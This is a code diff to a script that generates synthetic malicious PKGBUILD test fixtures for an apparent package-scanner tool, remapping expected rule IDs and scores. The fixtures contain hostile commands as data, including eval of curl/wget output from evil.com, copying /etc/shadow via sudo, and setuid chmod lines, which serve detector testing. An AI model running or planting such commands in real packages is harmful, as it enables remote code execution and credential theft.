@@ -2,6 +2,10 @@
 
 Usage:
     python scripts/gen_malicious_fixtures.py [--out tests/fixtures/malicious/synthetic]
+
+Labels are validated against the *shipped* config with a cold database,
+exactly the context the calibration gates measure, so what this script
+writes is what ``calibration_gates.py`` will check.
 """
 
 import argparse
@@ -9,8 +13,8 @@ import json
 import sys
 from pathlib import Path
 
+from calibration_gates import shipped_config
 from trustsight.analysis import scan_diff
-from trustsight.config import ensure_default_configs, load_config
 from trustsight.rules import load_rules
 
 
@@ -94,11 +98,11 @@ add("R004-skip-https-named",
 
 add("R004-skip-git-justified",
     header() + "sha256sums=('SKIP')\nsource=('git+https://github.com/user/repo.git')\n",
-    must_fire=[], must_not_fire=["R004", "R012", "R013"])
+    must_fire=["R004"], min_score=25)
 
 add("R004-skip-git-pkgname",
     header(pkgname="evil-pkg-git") + "sha256sums=('SKIP')\nsource=('https://github.com/user/repo.git')\n",
-    must_fire=[], must_not_fire=["R004", "R012", "R013"])
+    must_fire=["R004"], min_score=25)
 
 add("R004-skip-validpgpkeys",
     header() + "validpgpkeys=('DEADBEEF1234')\nsha256sums=('SKIP')\nsource=('https://example.com/pkg.tar.gz.asc')\n",
@@ -134,9 +138,9 @@ add("R007-install-modified",
     """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,5 @@
- # Maintainer: Alice <alice@example.com>
- pkgname=malicious-pkg
- pkgver=1.0
+# Maintainer: Alice <alice@example.com>
+pkgname=malicious-pkg
+pkgver=1.0
 +install=malicious-pkg.install
 """,
     must_fire=["R007"], min_score=15)
@@ -153,103 +157,103 @@ add("R008-ruby-e-url",
 
 # ── R009: sudo ────────────────────────────────────────────────────────────────
 
+# The sudo must be an added line *inside* an added build() body: R009 is
+# scoped to build/install functions, and a top-level sudo runs at source
+# time, which is a different claim (R129 territory, not R009's).
 add("R009-sudo-in-build",
-    header() + "sudo cp /etc/shadow /tmp/out\n",
-    must_fire=["R009"], min_score=40)
+    header() + "build() {\n+    sudo cp /etc/shadow /tmp/out\n+}\n",
+    must_fire=["R009"], min_score=40, max_score=70)
 
-# ── R010: curl (not piped) ────────────────────────────────────────────────────
+# ── R129: top-level (parse-time) fetch ───────────────────────────────────────
 
 add("R010-curl-fetch",
     header() + "curl -O https://example.com/pkg.tar.gz\n",
-    must_fire=["R010"], min_score=5)
-
-# ── R011: wget (not piped) ────────────────────────────────────────────────────
+    must_fire=["R129"], min_score=25)
 
 add("R011-wget-fetch",
     header() + "wget https://example.com/pkg.tar.gz\n",
-    must_fire=["R011"], min_score=5)
+    must_fire=["R129"], min_score=25)
 
-# ── R014: validpgpkeys added ─────────────────────────────────────────────────
+# ── R130: signing-key set changed (INFO fact) ────────────────────────────────
 
 add("R014-validpgpkeys-added",
     header() + "validpgpkeys=('DEADBEEF1234')\n",
-    must_fire=["R014"], min_score=25)
+    must_fire=["R130"])
 
-# ── R015: depends added ──────────────────────────────────────────────────────
+# ── D-series: dependency additions ───────────────────────────────────────────
 
+# R015 is a reserved ID (docs/reference/rules.md).  A plain depends addition
+# is reported as a fact and scored only by the stateful D001 (novelty needs a
+# seeded corpus), so under the gates' cold DB it is silent by design.
 add("R015-depends-added",
-    header() + "depends=('evil-pkg' 'another-pkg')\n",
-    must_fire=["R015"], min_score=15)
-
-# ── R016: makedepends/optdepends/checkdepends ────────────────────────────────
+    header() + "depends=('evil-pkg' 'another-pkg')\n")
 
 add("R016-makedepends-added",
     header() + "makedepends=('go' 'nodejs')\n",
-    must_fire=["R016"], min_score=10)
+    must_fire=["D003"], min_score=10)
 
+# Same cold-start silence as R015: an optdepends addition is reported, never
+# scored without corpus state.
 add("R016-optdepends-added",
-    header() + "optdepends=('evil-pkg: for the malicious feature')\n",
-    must_fire=["R016"], min_score=10)
+    header() + "optdepends=('evil-pkg: for the malicious feature')\n")
 
-# ── R017: chmod +s ───────────────────────────────────────────────────────────
+# ── R059: chmod +s ───────────────────────────────────────────────────────────
 
 add("R017-chmod-suid",
     header() + "chmod +s /usr/bin/elevate\n",
-    must_fire=["R017"], min_score=25)
+    must_fire=["R059"], min_score=25)
 
 add("R017-chmod-sgid",
     header() + "chmod g+s /usr/bin/elevate\n",
-    must_fire=["R017"], min_score=25)
+    must_fire=["R059"], min_score=25)
 
-# ── R018: ln -sf ──────────────────────────────────────────────────────────────
+# ── R128: build function writes outside $pkgdir ──────────────────────────────
 
 add("R018-ln-sf",
     header() + "ln -sf /usr/bin/elevate /usr/local/bin/normal\n",
-    must_fire=["R018"], min_score=15)
+    must_fire=["R128"], min_score=15)
 
-# ── R019: suspicious environment variable ────────────────────────────────────
+# ── R131: suspicious environment variable ────────────────────────────────────
 
 add("R019-cflags-suspicious",
     header() + 'CFLAGS="-O2 -funroll-loops -march=native -fomit-frame-pointer"\n',
-    must_fire=["R019"], min_score=10)
+    must_fire=["R131"], min_score=10)
 
-# ── R025: eval/exec ───────────────────────────────────────────────────────────
+# ── R039/R129: eval/exec ──────────────────────────────────────────────────────
 
 add("R025-eval",
     header() + 'eval "$(curl -s https://evil.com/payload)"\n',
-    must_fire=["R025", "R010"], min_score=30)
+    must_fire=["R039"], min_score=30)
 
 add("R025-exec",
     header() + 'exec "$(wget -qO- https://evil.com/payload)"\n',
-    must_fire=["R025", "R011"], min_score=30)
+    must_fire=["R129"], min_score=30)
 
-# ── R026: checksum changed to SKIP ───────────────────────────────────────────
+# ── R004/R005: checksum changes ──────────────────────────────────────────────
 
 add("R026-checksum-to-skip",
     """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,5 @@
- # Maintainer: Alice <alice@example.com>
- pkgname=malicious-pkg
- pkgver=1.0
+# Maintainer: Alice <alice@example.com>
+pkgname=malicious-pkg
+pkgver=1.0
 -sha256sums=('deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe1234')
 +sha256sums=('SKIP')
 """,
-    must_fire=["R026"], min_score=25)
-
-# ── R027: checksum array emptied ─────────────────────────────────────────────
+    must_fire=["R004"], min_score=25)
 
 add("R027-checksum-emptied",
     """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,5 @@
- # Maintainer: Alice <alice@example.com>
- pkgname=malicious-pkg
- pkgver=1.0
+# Maintainer: Alice <alice@example.com>
+pkgname=malicious-pkg
+pkgver=1.0
 -sha256sums=('deadbeef')
 +sha256sums=()
 """,
-    must_fire=["R027"], min_score=25)
+    must_fire=["R005"], min_score=25)
 
 
 # ── Controls ─────────────────────────────────────────────────────────────────
@@ -258,8 +262,8 @@ add("control-benign-version-bump",
     """--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,5 @@
- # Maintainer: Alice <alice@example.com>
- pkgname=benign-pkg
+# Maintainer: Alice <alice@example.com>
+pkgname=benign-pkg
 -pkgver=1.0
 +pkgver=1.1
 """,
@@ -275,10 +279,6 @@ def main():
                         / "tests" / "fixtures" / "malicious" / "synthetic")
     args = parser.parse_args()
 
-    ensure_default_configs()
-    config = load_config()
-    rules = load_rules()
-
     args.out.mkdir(parents=True, exist_ok=True)
 
     # Clear existing non-injection fixtures (keep R012/R013 ones)
@@ -289,47 +289,55 @@ def main():
     expected = {}
     failures = []
 
-    for fx in FIXTURES:
-        fname = fx["name"] + ".diff"
-        fpath = args.out / fname
+    # Labels must agree with the gates, so validate with the same context:
+    # shipped config, cold database, and the fixture's own name as the
+    # package name (which is what scan_malicious passes).
+    with shipped_config():
+        rules = load_rules()
 
-        fpath.write_text(fx["diff_text"])
+        for fx in FIXTURES:
+            fname = fx["name"] + ".diff"
+            fpath = args.out / fname
 
-        try:
-            fact = scan_diff(fx["diff_text"], rules=rules, config=config)
-        except Exception as exc:
-            failures.append(f"{fname}: scan_diff raised: {exc}")
-            continue
+            fpath.write_text(fx["diff_text"])
 
-        fired = {e.rule_id for e in fact.score_breakdown}
-        must = set(fx["expect"].get("must_fire", []))
-        must_not = set(fx["expect"].get("must_not_fire", []))
-        min_s = fx["expect"].get("min_score", 0)
-        max_s = fx["expect"].get("max_score", 100)
+            try:
+                fact = scan_diff(fx["diff_text"], rules=rules,
+                                 package_name=fx["name"])
+            except Exception as exc:
+                failures.append(f"{fname}: scan_diff raised: {exc}")
+                continue
 
-        missed = must - fired
-        if missed:
-            failures.append(f"{fname}: {missed} should fire, didn't. Fired: {fired}")
-        fired_wrong = must_not & fired
-        if fired_wrong:
-            failures.append(f"{fname}: {fired_wrong} should NOT fire")
-        if fact.final_score < min_s:
-            failures.append(f"{fname}: score {fact.final_score} < {min_s}")
-        if fact.final_score > max_s:
-            failures.append(f"{fname}: score {fact.final_score} > {max_s}")
+            fired = {e.rule_id for e in fact.score_breakdown}
+            must = set(fx["expect"].get("must_fire", []))
+            must_not = set(fx["expect"].get("must_not_fire", []))
+            min_s = fx["expect"].get("min_score", 0)
+            max_s = fx["expect"].get("max_score", 100)
 
-        entry = {}
-        if must:
-            entry["must_fire"] = sorted(must)
-        if must_not:
-            entry["must_not_fire"] = sorted(must_not)
-        if min_s > 0:
-            entry["min_score"] = min_s
-        if max_s < 100:
-            entry["max_score"] = max_s
-        expected[fname] = entry
+            missed = must - fired
+            if missed:
+                failures.append(f"{fname}: {missed} should fire, didn't. Fired: {fired}")
+            fired_wrong = must_not & fired
+            if fired_wrong:
+                failures.append(f"{fname}: {fired_wrong} should NOT fire")
+            if fact.final_score < min_s:
+                failures.append(f"{fname}: score {fact.final_score} < {min_s}")
+            if fact.final_score > max_s:
+                failures.append(f"{fname}: score {fact.final_score} > {max_s}")
 
-    # Merge with existing injection fixtures
+            entry = {}
+            if must:
+                entry["must_fire"] = sorted(must)
+            if must_not:
+                entry["must_not_fire"] = sorted(must_not)
+            if min_s > 0:
+                entry["min_score"] = min_s
+            if max_s < 100:
+                entry["max_score"] = max_s
+            expected[fname] = entry
+
+    # Merge with existing injection fixtures; carry relabelled/description
+    # notes forward so regeneration never erases the review trail.
     existing_exp = args.out / "expected.json"
     if existing_exp.exists():
         with open(existing_exp) as f:
@@ -337,6 +345,10 @@ def main():
         for k, v in existing.items():
             if k not in expected:
                 expected[k] = v
+            else:
+                for note_key in ("relabelled", "description"):
+                    if note_key in v and note_key not in expected[k]:
+                        expected[k][note_key] = v[note_key]
 
     with open(args.out / "expected.json", "w") as f:
         json.dump(expected, f, indent=2, ensure_ascii=False)
